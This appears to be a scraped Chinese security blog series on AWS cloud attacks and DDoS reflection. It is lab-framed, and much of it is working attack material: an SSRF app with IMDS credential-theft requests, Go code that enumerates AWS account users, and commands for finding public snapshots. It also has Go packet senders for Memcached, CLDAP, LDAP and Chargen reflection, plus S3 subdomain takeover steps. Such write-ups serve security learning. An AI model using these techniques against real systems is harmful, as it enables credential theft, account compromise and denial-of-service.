\u0026#34;.....\u0026#34;, \u0026#34;ProductCodes\u0026#34;: [], \u0026#34;PublicDnsName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;State\u0026#34;: { \u0026#34;Code\u0026#34;: 0, \u0026#34;Name\u0026#34;: \u0026#34;pending\u0026#34; }, :...skipping... 有正常的輸出代表建立EC2成功\n測試 bash內容有寫入資料到hello.txt，可以先查看這個檔案有沒有資料\n或是\n1 2 這裡儲存著cloud-init的log tail /var/log/cloud-init.log 1 2 這裡儲存cloud-init 輸出log tail /var/log/cloud-init-output.log ","date":"2023-10-08T00:00:00Z","permalink":"http://localhost:1313/p/day-26-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-reverse-shell-via-credential/","title":"[Day 26] 天堂雲端 - reverse shell via credential"},{"content":"AWS EBS AWS Elastic Block Store(EBS)是AWS提供的可擴展的高效能區塊儲存服務。通常EC2 instance上面的數據（包括操作系統、應用程序數據等）通常儲存在EBS上。而EC2的快照(snapshot)是EC2 instance的狀態的定期副本，通常是基於EBS volumes的，快照捕捉了EBS volumes上的數據的狀態。\n注：EC2實例本身具有暫時性存儲，稱為實例存儲（Instance Store），但該存儲通常用於臨時數據，並且不具備持久性。\n注：EBS是區塊儲存服務(Block Storage Service)，跟S3(Object Storage Service)不同。EBS主要儲存數據，操作系統，應用程序等；S3用於儲存和檢索任何類型的數據，並提供高度可擴展的存儲解決方案。\nPublic \u0026amp; Private EBS快照分為公開跟私有。當快照設定成公有時，任何人都可以存取這張快照。 取得Account下的快照 取得帳號下的所有快照\n1 \u0026gt; aws ec2 describe-snapshots --owner-ids {ACCOUNT_ID} Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 { \u0026#34;Snapshots\u0026#34;: [ { \u0026#34;Description\u0026#34;: \u0026#34;20231007-snapshot\u0026#34;, \u0026#34;Encrypted\u0026#34;: false, # 沒有設定加密 \u0026#34;OwnerId\u0026#34;: \u0026#34;{ACCOUNT_ID}\u0026#34;, \u0026#34;Progress\u0026#34;: \u0026#34;100%\u0026#34;, # 100%代表快照建立完成 \u0026#34;SnapshotId\u0026#34;: \u0026#34;snap-XXXXXXX\u0026#34;, \u0026#34;StartTime\u0026#34;: \u0026#34;{Date}\u0026#34;, \u0026#34;State\u0026#34;: \u0026#34;completed\u0026#34;, \u0026#34;VolumeId\u0026#34;: \u0026#34;vol-XXXXXXXXXX\u0026#34;, \u0026#34;VolumeSize\u0026#34;: X, \u0026#34;StorageTier\u0026#34;: \u0026#34;standard\u0026#34; } ] } 取得帳號下的公開快照\n1 \u0026gt; aws ec2 describe-snapshots --restorable-by-user-ids all --owner-ids {ACCOUNT_ID} 取得所有公開快照 1 \u0026gt; aws ec2 describe-snapshots --restorable-by-user-ids all Output\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 { \u0026#34;Snapshots\u0026#34;: [ { \u0026#34;Description\u0026#34;: \u0026#34;hvm-ssd/ubuntu-trusty-amd64-server-20170202.1\u0026#34;, \u0026#34;Encrypted\u0026#34;: false, \u0026#34;OwnerId\u0026#34;: \u0026#34;099720109477\u0026#34;, \u0026#34;Progress\u0026#34;: \u0026#34;100%\u0026#34;, \u0026#34;SnapshotId\u0026#34;: \u0026#34;snap-046281ab24d756c50\u0026#34;, \u0026#34;StartTime\u0026#34;: \u0026#34;2017-02-02T23:57:19+00:00\u0026#34;, \u0026#34;State\u0026#34;: \u0026#34;completed\u0026#34;, \u0026#34;VolumeId\u0026#34;: \u0026#34;vol-033ca269aeedb3521\u0026#34;, \u0026#34;VolumeSize\u0026#34;: 8, \u0026#34;OwnerAlias\u0026#34;: \u0026#34;amazon\u0026#34;, \u0026#34;StorageTier\u0026#34;: \u0026#34;standard\u0026#34; }, { \u0026#34;Description\u0026#34;: \u0026#34;hvm/ubuntu-trusty-amd64-server-20170202.1\u0026#34;, \u0026#34;Encrypted\u0026#34;: false, \u0026#34;OwnerId\u0026#34;: \u0026#34;099720109477\u0026#34;, \u0026#34;Progress\u0026#34;: \u0026#34;100%\u0026#34;, \u0026#34;SnapshotId\u0026#34;: \u0026#34;snap-00de7e12fd08987c4\u0026#34;, \u0026#34;StartTime\u0026#34;: \u0026#34;2017-02-02T23:44:49+00:00\u0026#34;, \u0026#34;State\u0026#34;: \u0026#34;completed\u0026#34;, \u0026#34;VolumeId\u0026#34;: \u0026#34;vol-0bf7e5b6270473ac6\u0026#34;, \u0026#34;VolumeSize\u0026#34;: 8, \u0026#34;OwnerAlias\u0026#34;: \u0026#34;amazon\u0026#34;, \u0026#34;StorageTier\u0026#34;: \u0026#34;standard\u0026#34; }, .... ","date":"2023-10-07T00:00:00Z","permalink":"http://localhost:1313/p/day-24-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-%E5%8F%96%E5%BE%97ec2%E5%BF%AB%E7%85%A7snapshot/","title":"[Day 24] 天堂雲端 - 取得EC2快照(snapshot)"},{"content":"Memcached Memcached跟Redis都是常見的快取（Caching）和分佈式數據儲存解決方案，兩者都是in-memory database，兩者都提供使用者低延遲、高效率來存取資料。兩者通常也都忘記設定權限。\n測試 stats 攔截封包 發送一個stats反射的封包 code 先用Dial發送一個\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;time\u0026#34; ) func main() { targetIP := \u0026#34;10.211.55.10\u0026#34; targetPort := 11211 // 构建TCP连接 conn, err := net.DialTimeout(\u0026#34;tcp\u0026#34;, fmt.Sprintf(\u0026#34;%s:%d\u0026#34;, targetIP, targetPort), 10*time.Second) if err != nil { log.Fatal(err) } defer conn.Close() // 构建Payload数据 payload := \u0026#34;stats\\r\\nstats\\r\\nstats\\r\\nstats items\\r\\nstats\\r\\nstats\\r\\nstats\\r\\nstats\\r\\nstats\\r\\nstats\\r\\nstats\\r\\nstats\\r\\nstats\\r\\nstats\\r\\n\u0026#34; // 发送数据包 _, err = conn.Write([]byte(payload)) if err != nil { log.Fatal(err) } fmt.Println(\u0026#34;Packet sent successfully!\u0026#34;) } ","date":"2023-10-07T00:00:00Z","permalink":"http://localhost:1313/p/day-24-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-memcached%E5%8F%8D%E5%B0%84%E6%94%BB%E6%93%8A/","title":"[Day 24] 閑的沒事 - Memcached反射攻擊"},{"content":"Account ID \u0026amp; ARN 昨天提到可以用SSRF等技術取得API KEY等資訊。 如果說已取得API KEY，可以用AWS CLI提供的get-access-key-info取得Account ID\n1 2 3 4 aws sts get-access-key-info --access-key-id=XXXXXXXXXXXX { \u0026#34;Account\u0026#34;: \u0026#34;ACCOUNT_ID\u0026#34; } 目標 在不存取任何AWS帳戶的情況下，要怎麼枚舉有效的AWS帳戶名稱？\nAmazon Resource Name(ARN) Amazon Resource Name(ARN)結構如下：\n1 arn:partition:service:region:account-id:resource-type/resource 用於唯一識別和管理資源的標識符。每個資源都有一個，包括IAM使用者和IAM組。\n使用ARN枚舉AWS Account ID和ARN 第一種方法：UpdateAssumeRolePolicy 先使用ARN枚舉帳戶名稱 UpdateAssumeRolePolicy是AWS提供的一個更新IAM角色的AssumeRole的策略。\n創建不相關的AWS帳戶 建立一個不相關的AWS帳戶，接著建立一個角色。\n枚舉 在角色的編輯信任政策中加入以下內容\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Deny\u0026#34;, \u0026#34;Principal\u0026#34;: { \u0026#34;AWS\u0026#34;: \u0026#34;arn:aws:iam::ACCOUNT_ID:user/USER_NAME\u0026#34; }, \u0026#34;Action\u0026#34;: \u0026#34;sts:AssumeRole\u0026#34; } ] } 如果正確枚舉到USER_NAME，網頁會回傳信任政策已更新。等代表執行成功的回應。如果是錯誤的USER_NAME，網頁會回傳無法更新信任政策。Invalid principal in policy: \u0026quot;AWS\u0026quot;:\u0026quot;arn:aws:iam::ACCOUNT_ID:user/XXXXX\u0026quot;等資訊。\n如果大量枚舉需要做成自動化會類似以下的code\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/aws/aws-sdk-go/aws\u0026#34; \u0026#34;github.com/aws/aws-sdk-go/aws/credentials\u0026#34; \u0026#34;github.com/aws/aws-sdk-go/aws/session\u0026#34; \u0026#34;github.com/aws/aws-sdk-go/service/iam\u0026#34; ) func main() { sess, err := session.NewSession(\u0026amp;aws.Config{ Region: aws.String(\u0026#34;us-east-1\u0026#34;), Credentials: credentials.NewStaticCredentials(\u0026#34;XXXXx\u0026#34;, \u0026#34;XXXXXXXXXX\u0026#34;, \u0026#34;\u0026#34;), }) if err != nil { fmt.Println(\u0026#34;Error creating session:\u0026#34;, err) return } svc := iam.New(sess) roleName := \u0026#34;Role Name\u0026#34; newPolicyDocument := `{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Deny\u0026#34;, \u0026#34;Principal\u0026#34;: { \u0026#34;AWS\u0026#34;: \u0026#34;arn:aws:iam::ACCOUNT_ID:user/NAME\u0026#34; }, \u0026#34;Action\u0026#34;: \u0026#34;sts:AssumeRole\u0026#34; } ] }` _, err = svc.UpdateAssumeRolePolicy(\u0026amp;iam.UpdateAssumeRolePolicyInput{ RoleName: \u0026amp;roleName, PolicyDocument: \u0026amp;newPolicyDocument, }) if err != nil { fmt.Println(\u0026#34;Error updating AssumeRole policy:\u0026#34;, err) return } fmt.Printf(\u0026#34;AssumeRole policy for role %s updated successfully.\\n\u0026#34;, roleName) } 第二種方法：在自己環境的AWS服務上指派政策 與UpdateAssumeRolePolicy一樣。建立一個新的S3 bucket，在政策下測試是否可以正確地新增policy。\n","date":"2023-10-06T00:00:00Z","permalink":"http://localhost:1313/p/day-23-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-aws-account-id-enumeration/","title":"[Day 23] 天堂雲端 - AWS Account ID Enumeration"},{"content":"CLDAP Connectionless Lightweight Directory Access Protocol(CLDAP)無連結輕量級目錄協議，與LDAP類似，基於UDP協議。為了效能與便利性，使用UDP 389 port進行傳輸。\ncode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package main import ( \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; ) func main() { targetIP := \u0026#34;10.211.55.10\u0026#34; targetPort := 389 conn, err := net.DialUDP(\u0026#34;udp\u0026#34;, nil, \u0026amp;net.UDPAddr{ IP: net.ParseIP(targetIP), Port: targetPort, }) if err != nil { log.Fatalf(\u0026#34;Failed to create UDP connection: %v\u0026#34;, err) } defer conn.Close() cldapPacket := []byte{ ... } _, err = conn.Write(cldapPacket) if err != nil { log.Fatalf(\u0026#34;Failed to send CLDAP packet: %v\u0026#34;, err) } } 先奉上用Dial寫的udp packet。cldapPacket那邊應該要用結構體寫，原本是硬寫，好像不太對。明明改改。\nCLDAP廣泛用於Windows伺服器的AD，哎但我沒有可以測的..\n","date":"2023-10-06T00:00:00Z","permalink":"http://localhost:1313/p/day-23-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-cldap%E6%94%BE%E5%A4%A7%E6%94%BB%E6%93%8A/","title":"[Day 23] 閑的沒事 - CLDAP放大攻擊"},{"content":"寫一個簡單的SSRF漏洞\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from flask import Flask, request import requests app = Flask(__name__) @app.route(\u0026#34;/index\u0026#34;) # 127.0.0.1/8000/index?url={URL} def follow_url(): url = request.args.get(\u0026#34;url\u0026#34;, \u0026#34;\u0026#34;) if url: return requests.get(url).text return \u0026#34;no url parameter provided\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=8000) 把這份含有SSRF漏洞的Web應用程式丟到EC2上面執行，因為是測試用直接python3 {執行檔}就好了，就不設定瀏覽器服務。\n取得Instance MetaService Credential 雖然IMDS僅在實例內部可用，不能通過網絡從外部訪問。但是透過SSRF漏洞可以執行外部訪問IMDS憑證\n查詢EC2 instance 是否有關聯的IAM role Request\n1 curl /index?url=http://169.254.169.254/latest/meta-data/iam Output\n1 info security-credentials/ 確定有關聯的IAM role\n返回與Credential關聯的IAM role名稱 Request\n1 curl http://ec2-54-156-95-23.compute-1.amazonaws.com:12345/index?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ Output\n1 role name 如果是在自己架設的環境測試的話，可以進到EC2 -\u0026gt; 執行個體 -\u0026gt; 執行個體詳細資訊中查看輸出是否跟IAM 角色相符 檢索Credential Request\n1 curl http://ec2-54-156-95-23.compute-1.amazonaws.com:12345/index?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{role name} Output 大概會長這樣\n1 { \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;Date\u0026#34;, \u0026#34;Type\u0026#34; : \u0026#34;AWS-HMAC\u0026#34;, \u0026#34;AccessKeyId\u0026#34; : \u0026#34;XXXXXXXXXXXX\u0026#34;, \u0026#34;SecretAccessKey\u0026#34; : \u0026#34;XXXXXXXX\u0026#34;, \u0026#34;Token\u0026#34; : \u0026#34;XXXXXXXX\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;Date\u0026#34; } ","date":"2023-10-05T00:00:00Z","permalink":"http://localhost:1313/p/day-22-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-ec2-metaservice-credentials%E6%B4%A9%E6%BC%8F-by-ssrf-poc/","title":"[Day 22] 天堂雲端 - EC2 MetaService Credentials洩漏 by SSRF POC"},{"content":"繼續昨天沒寫完的坑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 func main() { conn, err := net.Dial(\u0026#34;tcp\u0026#34;, fmt.Sprintf(\u0026#34;%s:%d\u0026#34;, targetIP, targetPort)) if err != nil { log.Fatalf(\u0026#34;Failed to connnect target ip: %v\u0026#34;, err) } defer conn.Close() ldapSearchRequest := LDAPSearchRequest{ BaseDN: \u0026#34;dc=example,dc=com\u0026#34;, Scope: 2, // Whole Subtree Filter: \u0026#34;(objectClass=*)\u0026#34;, Attributes: []string{\u0026#34;All User Attributes\u0026#34;}, } ldapSearchRequestBytes, err := asn1.Marshal(ldapSearchRequest) if err != nil { log.Fatalf(\u0026#34;Failed to encode LDAP search request : %v\u0026#34;, err) } ldapPacket := gopacket.NewSerializeBuffer() opts := gopacket.SerializeOptions{} tcpLayer := \u0026amp;layers.TCP{ SrcPort: layers.TCPPort(12345), DstPort: layers.TCPPort(389), Seq: 110, Ack: 200, SYN: true, Window: 14600, } err = tcpLayer.SerializeTo(ldapPacket, opts) if err != nil { log.Fatalf(\u0026#34;Failed to add to tcp layer: %v\u0026#34;, err) } err = gopacket.SerializeLayers(ldapPacket, opts, gopacket.Payload(ldapSearchRequestBytes)) if err != nil { log.Fatalf(\u0026#34;Failed to add payload: %v\u0026#34;, err) } _, err = conn.Write(ldapPacket.Bytes()) if err != nil { log.Fatalf(\u0026#34;Failed to send packet: %v\u0026#34;, err) } } type LDAPSearchRequest struct { BaseDN string `asn1:\u0026#34;octetstring\u0026#34;` Scope int `asn1:\u0026#34;enumerated\u0026#34;` DerefAlias int `asn1:\u0026#34;enumerated\u0026#34;` SizeLimit int `asn1:\u0026#34;integer\u0026#34;` TimeLimit int `asn1:\u0026#34;integer\u0026#34;` TypesOnly bool `asn1:\u0026#34;boolean\u0026#34;` Filter string `asn1:\u0026#34;octetstring\u0026#34;` Attributes []string `asn1:\u0026#34;set\u0026#34;` } 原本要先從捕獲封包開始寫的，結果code不知道丟哪了 先用dial寫一個，休息一下\n","date":"2023-10-05T00:00:00Z","permalink":"http://localhost:1313/p/day-22-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-ldap%E6%94%BE%E5%A4%A7%E6%94%BB%E6%93%8A/","title":"[Day 22] 閑的沒事 - LDAP放大攻擊"},{"content":"在接下去寫EC2 POC之前，先來解釋AWS IMDS是啥\nAWS Metadata Service (IMDS) IMDS是有關實例的元數據（Metadata），可用於設定或管理正在執行的實例（例如EC2 instance）。這些元數據包含有關實例的重要資訊，例如實例的ID、IAM角色、IP地址、實例類型、安全組等等。IMDS是一個RESTful API，通常在實例內部運行，用於提供對這些數據的安全訪問。\n注：IMDS僅在實例內部可用，不能通過網絡從外部訪問。\nIMDS RESTful API 查詢EC2 instance ID 1 \u0026gt; curl http://169.254.169.254/latest/meta-data/instance-id IAM Role IAM role關聯的名稱\n1 \u0026gt; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 如果沒有關聯的role則返回404\n檢索credential\n1 \u0026gt; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name} 安全組 1 \u0026gt; curl http://169.254.169.254/latest/meta-data/security-groups IP Address 私有IP地址\n1 \u0026gt; curl http://169.254.169.254/latest/meta-data/local-ipv4 公有IP地址(如果有)\n1 \u0026gt; http://169.254.169.254/latest/meta-data/public-ipv4 主機名（包括公有DNS和私有DNS）\n1 \u0026gt; http://169.254.169.254/latest/meta-data/public-hostname 1 \u0026gt; http://169.254.169.254/latest/meta-data/local-hostname ","date":"2023-10-04T00:00:00Z","permalink":"http://localhost:1313/p/day-21-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-aws-metadata-service-imds/","title":"[Day 21] 天堂雲端 - AWS Metadata Service (IMDS)"},{"content":"LDAP Lightweight Directory Access Protocol（LDAP）是一種輕量的目錄服務協定（Directory Access Protocol，DAP）。目錄服務通常提供了有組織的記錄集合，這些記錄通常具有層級結構，也就是說這些資料之間存在著父子或是兄弟的關係。 LDAP的常見用途之一是提供中央位置來進行身份驗證，其中包括用戶帳戶和密碼的儲存，例如在Docker、Jenkins、Kubernetes、Open VPN和Linux Samba等服務中用於驗證帳戶和密碼。此外，系統管理員還可以使用LDAP單一登入來控制對LDAP資料庫的訪問。 實作了LDAP的軟體程式可以被視為是專門用來讀取資料的資料庫(這些資料可能經常被讀取，但不常被變動)，例如說經常用來儲存姓名、電子郵件、電話、地址等人事資料，或是拿來做使用者權限的驗證。\n測試 安裝slapd 確定389 port被佔用 測試 我拿之前測試用的kali主機當ldap的client端 client端發送request 攔截封包 ldap主機攔截封包 明天寫攔截並發送ldap協定封包。\n","date":"2023-10-04T00:00:00Z","permalink":"http://localhost:1313/p/day-21-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-ldap%E6%94%BE%E5%A4%A7%E6%94%BB%E6%93%8A%E4%B9%8Bsladp%E7%99%BC%E9%80%81ldap%E5%8D%94%E5%AE%9A/","title":"[Day 21] 閑的沒事 - LDAP放大攻擊之sladp發送ldap協定"},{"content":"AWS EC2 Amazon Elastic Compute Cloud (AWS EC2)是AWS提供的IaaS服務，等同於在AWS上開啟虛擬機。\n建立EC2 首先，先建立一台EC2靶機。記得安裝openssh 註：因為是當成靶機的關係，我是用SSH的方式連線雲端主機，如果是production環境的話可以換成System Manager快速設定ssm。因為吃流量計費所以我就先不用了\n快速建立一個Flask Web app，放到這台EC2靶機中\n1 2 3 4 5 6 7 8 9 10 11 12 from flask import Flask app = Flask(__name__) @app.route(\u0026#34;/\u0026#34;) def index(): return \u0026#34;Hello World!\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=8000) 編輯安全組規則 把flask佔用的PORT加到安全組規則中，不然外網吃不到。\n測試 外網連接公有 IPv4 DNS，通常長這樣 - ec2-{IP}.compute-1.amazonaws.com，確認可以看到Hello World就可以接著後續的測試。\n","date":"2023-10-03T00:00:00Z","permalink":"http://localhost:1313/p/day-20-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-ec2%E4%B9%8B%E5%BB%BA%E7%AB%8B%E9%9D%B6%E6%A9%9F/","title":"[Day 20] 天堂雲端 - EC2之建立靶機"},{"content":"Chargen 字符產生器協定The Character Generator Protocol (Chargen)顧名思義就是會一直發送字元的協定。默認PORT為19/UDP跟19/TCP，初衷是為了測試與診斷網際網路連線，發送方式有TCP跟UDP兩種：\nTCP連線建立後: 伺服器不斷傳送任意的字元到客戶端，直到客戶端關閉連線。 UDP連線建立後: 每當伺服器收到客戶端的一個UDP數據包，這個數據包中的內容將被丟棄，而伺服器將傳送一個數據包到客戶端，其中包含長度為0～512位元組之間隨機值的任意字元。 輸出數據格式 RFC 864沒有規定輸出的具體準確格式。實際操作結果是，輸出每行72個字元，這些字元是ASCII可列印字元，印完了重頭開始繼續。\n測試 作業系統：Ubuntu 服務：xinetd 修改：把/etc/xinetd.d/chargen裡面的disable改成no 測試：\n1 \u0026gt; telnet -r localhost 19 結果 Code 寫了一個udp範例，模仿chargen服務。只要code不停就不段發送，仿照chargen協議。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 package main import ( \u0026#34;log\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/google/gopacket\u0026#34; \u0026#34;github.com/google/gopacket/layers\u0026#34; \u0026#34;github.com/google/gopacket/pcap\u0026#34; ) func main() { var ( device string = \u0026#34;bridge100\u0026#34; snapshotLen int32 = 1024 promiscuous bool = false err error timeout time.Duration = 10 * time.Second handle *pcap.Handle buffer gopacket.SerializeBuffer random *rand.Rand ) handle, err = pcap.OpenLive(device, snapshotLen, promiscuous, timeout) if err != nil { log.Fatal(err) } defer handle.Close() random = rand.New(rand.NewSource(time.Now().UnixNano())) srcPort := layers.UDPPort(random.Intn(65535)) dstPort := layers.UDPPort(19) ethernetLayer := \u0026amp;layers.Ethernet{ SrcMAC: net.HardwareAddr{0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00}, DstMAC: net.HardwareAddr{0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00}, EthernetType: layers.EthernetTypeIPv4, } ipLayer := \u0026amp;layers.IPv4{ SrcIP: net.IP{10, 211, 55, 3}, DstIP: net.IP{10, 211, 55, 10}, Version: 4, TTL: 64, Protocol: layers.IPProtocolUDP, } udpLayer := \u0026amp;layers.UDP{ SrcPort: srcPort, DstPort: dstPort, } udpLayer.SetNetworkLayerForChecksum(ipLayer) // Chargen query chargenQuery := []byte(\u0026#34;!\\\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{|}\u0026#34;) payload := chargenQuery for { buffer = gopacket.NewSerializeBuffer() opts := gopacket.SerializeOptions{ FixLengths: true, ComputeChecksums: true, } if err := gopacket.SerializeLayers(buffer, opts, ethernetLayer, ipLayer, udpLayer, gopacket.Payload(payload)); err != nil { log.Fatal(err) } udpPacket := buffer.Bytes() err = handle.WritePacketData(udpPacket) if err != nil { log.Fatal(err) os.Exit(1) } } } 反射攻擊 以上code是一段模仿chargen的code，可以放在已被感染的主機上。接下來攻擊者只要發送一段小小的request指引這個被感染的主機不停發送字元。\n攔截封包 大概長的會是這樣，因為for迴圈是包在udpLayer後面的，所以所有封包都是同一個port發出來 防護 chargen不是常用協議，被利用的話只要把/etc/xinetd.d/chargen的disable改yes就好了\n","date":"2023-10-03T00:00:00Z","permalink":"http://localhost:1313/p/day-20-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-chargen%E5%8F%8D%E5%B0%84%E6%94%BB%E6%93%8A/","title":"[Day 20] 閑的沒事 - Chargen反射攻擊"},{"content":"AWS Elastic Beanstalk AWS Elastic Beanstalk是AWS提供一個全受管的PaaS服務，用於建構、部署Web應用程式，只要使用者上傳code，Elastic Beanstalk會自動部署、負載平衡、自動調整等功能。看起來就像在薛不懂infra的人。\n建立新環境 建立好後去EC2看會看到beanstalk幫你建ㄧ台EC2機器。雖然本身beanstalk不收費，但這個服務就是建好infra的工作。\n常見的Elastic Beanstalk漏洞 1. Takeover beanstalk web endpoint：http://[name].-[region].elasticbeanstalk.com 跟S3 takeover一樣，如果找到有DNS record存在一個被砍掉的beanstalk域名，攻擊者接管這個域名\n2. SSRF/XSS/SQL Injection/ 部署的程式碼本身含有SSRF、XSS、SQL Injection等漏洞，攻擊者擷取到Metadata Service、IAM等資料。\n","date":"2023-10-02T00:00:00Z","permalink":"http://localhost:1313/p/day-19-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-aws-elastic-beanstalk/","title":"[Day 19] 天堂雲端 - AWS Elastic Beanstalk"},{"content":"SNMP 簡易網路管理通訊協定 SNMP(Simmple Network Management Protocol)用於交換網路裝置之間的管理資訊，用於傳輸控制通訊協定/網際網路通訊協定 (TCP⁄IP) 通訊協定組合的一部分。\nSNMP getbulkrequest SNMPv2 新加的getbulkrequest用於一次發出大量的請求訊息，減少管理站跟管理設備的交互次數。\n測試 1 \u0026gt; snmpbulkget -v2c -Cn0 -Cr70 -c {community string} {host or ip} {OID} Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 類似這樣 iso.3.6.1.2.1.1.9.1.3.5 = STRING: \u0026#34;View-based Access Control Model for SNMP.\u0026#34; iso.3.6.1.2.1.1.9.1.3.6 = STRING: \u0026#34;The MIB module for managing TCP implementations\u0026#34; iso.3.6.1.2.1.1.9.1.3.7 = STRING: \u0026#34;The MIB module for managing IP and ICMP implementations\u0026#34; iso.3.6.1.2.1.1.9.1.3.8 = STRING: \u0026#34;The MIB module for managing UDP implementations\u0026#34; iso.3.6.1.2.1.1.9.1.3.9 = STRING: \u0026#34;The MIB modules for managing SNMP Notification, plus filtering.\u0026#34; iso.3.6.1.2.1.1.9.1.3.10 = STRING: \u0026#34;The MIB module for logging SNMP Notifications.\u0026#34; iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.2.1.0 = INTEGER: 2 iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1 iso.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2 ","date":"2023-10-02T00:00:00Z","permalink":"http://localhost:1313/p/day-19-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B-snmp%E5%8F%8D%E5%B0%84%E6%94%BB%E6%93%8A%E4%B9%8Bsnmp%E6%B8%AC%E8%A9%A6/","title":"[Day 19] 閑的沒事 - SNMP反射攻擊之SNMP測試"},{"content":"S3 takeover POC 第一步：確認target ip 第二步：掃描target ip 下符合條件的子域 第三步：確認這個S3 bucket web endpoint是不存在的 第四步：takeover it!\n第一步 確認標的：example.com # 我沒有域名，很窮QQ\n第二部 找出所有子域\n1. 使用dig查詢DNS record 1 2 3 4 5 6 7 8 # 列出 authority section \u0026gt; dig example.com ... ;; AUTHORITY SECTION: example.com.\t71232\tIN\tNS\ta.iana-servers.net. example.com.\t71232\tIN\tNS\tb.iana-servers.net. ... 1 2 # 找出所有subdomain \u0026gt; dig @a.iana-servers.net example.com axfr 如果有找到subdomain會輸出類似以下數據\n1 2 mail.example.com.\t1800\tIN\tA\t1.2.3.4 www.example.com.\t1800\tIN\tA\t5.6.7.8 查找CNAME指向子域名的s3 web endpoint\n1 \u0026gt; dig sub.example.com 2. 使用Shodan或Fofa等搜尋banner 找出banner有以下關鍵字\n1 \u0026lt;Code\u0026gt;NoSuchBucket\u0026lt;/Code\u0026gt; 第三步：確認這個S3 bucket不存在 Response:\n1 2 3 4 5 \u0026lt;Error\u0026gt; \u0026lt;Code\u0026gt;NoSuchBucket\u0026lt;/Code\u0026gt; \u0026lt;Message\u0026gt;The specified bucket does not exist\u0026lt;/Message\u0026gt; \u0026lt;BucketName\u0026gt;...\u0026lt;/BucketName\u0026gt; \u0026lt;/Error\u0026gt; 第四部：takeover！ 創建一個名字一樣地域一樣的s3 